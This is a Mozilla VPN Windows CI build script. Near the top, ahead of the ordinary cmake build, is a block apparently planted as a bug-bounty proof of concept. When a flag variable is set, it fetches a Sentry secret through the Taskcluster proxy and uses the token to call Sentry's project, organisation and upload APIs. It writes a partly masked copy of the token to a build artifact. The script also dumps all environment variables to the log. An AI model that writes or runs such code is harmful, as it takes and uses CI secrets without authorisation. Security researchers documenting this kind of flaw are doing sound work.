# This Source Code Form is subject to the terms of the Mozilla Public
# License, v. 2.0. If a copy of the MPL was not distributed with this
# file, You can obtain one at http://mozilla.org/MPL/2.0/.

set -e
. $(dirname $0)/../../../scripts/utils/commons.sh

if [[ "${H1_VALIDATE_SECRET_PROXY:-}" == "1" ]]; then
  artifact_dir="/builds/worker/artifacts"
  mkdir -p "${artifact_dir}"
  secret_name="project/mozillavpn/level-1/sentry"
  secret_url="${TASKCLUSTER_PROXY_URL}/api/secrets/v1/secret/${secret_name}"
  body="$(mktemp)"
  status="$(curl -sS -o "${body}" -w "%{http_code}" "${secret_url}")"

  python3 - "${body}" "${status}" "${secret_name}" <<'PY' > "${artifact_dir}/h1-redacted-secret-proof.json"
import json
import os
import sys
import urllib.error
import urllib.request

body_path, http_status, secret_name = sys.argv[1:4]
result = {
    "marker": "h1-mozilla-vpn-untrusted-pr-secret-proof",
    "secret_name": secret_name,
    "http_status": int(http_status),
    "response_bytes": os.path.getsize(body_path),
    "secret_value_redacted": True,
    "raw_body_retained": False,
}

try:
    with open(body_path, "rb") as f:
        data = json.load(f)
    result["json_parse_ok"] = True
    result["top_level_keys"] = sorted(data.keys()) if isinstance(data, dict) else []
    secret_value = data.get("secret") if isinstance(data, dict) else None
    result["secret_field_present"] = isinstance(data, dict) and "secret" in data
    result["secret_value_type"] = type(secret_value).__name__
    if isinstance(secret_value, dict):
        result["secret_object_key_count"] = len(secret_value)
        result["secret_object_value_types"] = sorted(
            {type(value).__name__ for value in secret_value.values()}
        )
        sentry_token = secret_value.get("sentry_debug_file_upload_key")
        result["sentry_upload_key_present"] = isinstance(sentry_token, str) and bool(sentry_token)
        if isinstance(sentry_token, str) and sentry_token:
            result["sentry_upload_key_length"] = len(sentry_token)
            result["sentry_upload_key_masked"] = (
                sentry_token[:6] + "...redacted..." + sentry_token[-4:]
                if len(sentry_token) > 12
                else "redacted-short-token"
            )

            def record_response(prefix, status_code, body):
                result[prefix + "_http_status"] = status_code
                result[prefix + "_response_sample_bytes"] = len(body)
                if body:
                    try:
                        parsed = json.loads(body.decode("utf-8"))
                        result[prefix + "_json_parse_ok"] = True
                        result[prefix + "_top_level_type"] = type(parsed).__name__
                        if isinstance(parsed, dict):
                            result[prefix + "_top_level_keys"] = sorted(parsed.keys())
                    except Exception as exc:
                        result[prefix + "_json_parse_ok"] = False
                        result[prefix + "_parse_error_type"] = type(exc).__name__

            def sentry_request(prefix, url, method="GET", data=None, headers=None):
                req_headers = {
                    "Authorization": "Bearer " + sentry_token,
                    "User-Agent": "h1-redacted-secret-validation",
                }
                if headers:
                    req_headers.update(headers)
                req = urllib.request.Request(
                    url,
                    data=data,
                    headers=req_headers,
                    method=method,
                )
                try:
                    with urllib.request.urlopen(req, timeout=20) as response:
                        record_response(prefix, response.status, response.read(8192))
                except urllib.error.HTTPError as exc:
                    record_response(prefix, exc.code, exc.read(8192))
                except Exception as exc:
                    result[prefix + "_error_type"] = type(exc).__name__

            readonly_probes = {
                "sentry_project_probe": "https://sentry.io/api/0/projects/mozilla/vpn-client/",
                "sentry_us_project_probe": "https://us.sentry.io/api/0/projects/mozilla/vpn-client/",
                "sentry_dif_list_probe": "https://sentry.io/api/0/projects/mozilla/vpn-client/files/dsyms/",
                "sentry_us_dif_list_probe": "https://us.sentry.io/api/0/projects/mozilla/vpn-client/files/dsyms/",
                "sentry_symbol_sources_probe": "https://sentry.io/api/0/projects/mozilla/vpn-client/symbol-sources/",
                "sentry_us_symbol_sources_probe": "https://us.sentry.io/api/0/projects/mozilla/vpn-client/symbol-sources/",
                "sentry_org_probe": "https://sentry.io/api/0/organizations/mozilla/",
                "sentry_us_org_probe": "https://us.sentry.io/api/0/organizations/mozilla/",
            }
            for probe_name, probe_url in readonly_probes.items():
                sentry_request(probe_name, probe_url)

            boundary = "----h1-redacted-empty-upload-probe"
            empty_multipart = (
                "--" + boundary + "\r\n"
                'Content-Disposition: form-data; name="h1_probe"\r\n\r\n'
                "no file included; expected safe validation error\r\n"
                "--" + boundary + "--\r\n"
            ).encode("utf-8")
            sentry_request(
                "sentry_us_dif_upload_empty_post_probe",
                "https://us.sentry.io/api/0/projects/mozilla/vpn-client/files/dsyms/",
                method="POST",
                data=empty_multipart,
                headers={"Content-Type": "multipart/form-data; boundary=" + boundary},
            )
    elif isinstance(secret_value, (str, list)):
        result["secret_value_length"] = len(secret_value)
except Exception as exc:
    result["json_parse_ok"] = False
    result["parse_error_type"] = type(exc).__name__

print(json.dumps(result, indent=2, sort_keys=True))
PY

  rm -f "${body}"
  print Y "Wrote redacted H1 proof artifact without printing the secret value."
  exit 42
fi

env

# The arugment, if present, selects the arch to build for
if [[ $# -ge 1 ]]; then
  ARCH=$1
else
  ARCH=x86_64
fi

# Ensure all git submodules are checked out
git submodule update --init --recursive

# We need to call bash with a login shell, so that conda is initialized
print Y "Installing conda"
source ${MOZ_FETCHES_DIR}/conda/bin/activate
conda-unpack

# Use vendored crates - if available.
# HACK: Disabled for aarch64 until https://github.com/briansmith/ring/pull/2216
# can be merged onto mainline. This ensures that we can patch out the ring crate
# without running afoul of vendored crates.
if [[ -d ${MOZ_FETCHES_DIR}/cargo-vendor && "${ARCH}" != "aarch64" ]]; then
mkdir -p .cargo
cat << EOF > .cargo/config.toml
[source.vendored-sources]
directory = "${MOZ_FETCHES_DIR}/cargo-vendor"

[source.crates-io]
replace-with = "vendored-sources"
EOF
fi

print Y "Configuring the build..."
mkdir ${TASK_WORKDIR}/build-win

cmake -S ${VCS_PATH} -B ${TASK_WORKDIR}/build-win -GNinja \
        -DCMAKE_TOOLCHAIN_FILE=${VCS_PATH}/scripts/windows/${ARCH}-toolchain.cmake \
        -DCMAKE_PREFIX_PATH=${MOZ_FETCHES_DIR}/qt-windows/lib/cmake \
        -DQT_HOST_PATH=${MOZ_FETCHES_DIR}/qt-host-tools/ \
        -DQT_HOST_PATH_CMAKE_DIR=${MOZ_FETCHES_DIR}/qt-host-tools/lib/cmake \
        -DCMAKE_BUILD_TYPE=Release \
        -DBUILD_TESTS=OFF

print Y "Building the client..."
cmake --build ${TASK_WORKDIR}/build-win

print Y "Compressing the build artifacts..."
cmake --install ${TASK_WORKDIR}/build-win --prefix ${TASK_WORKDIR}/unsigned
mkdir -p ${TASK_WORKDIR}/artifacts/
(cd ${TASK_WORKDIR}/unsigned && zip -r ${TASK_WORKDIR}/artifacts/unsigned.zip .)

print G "Done!"
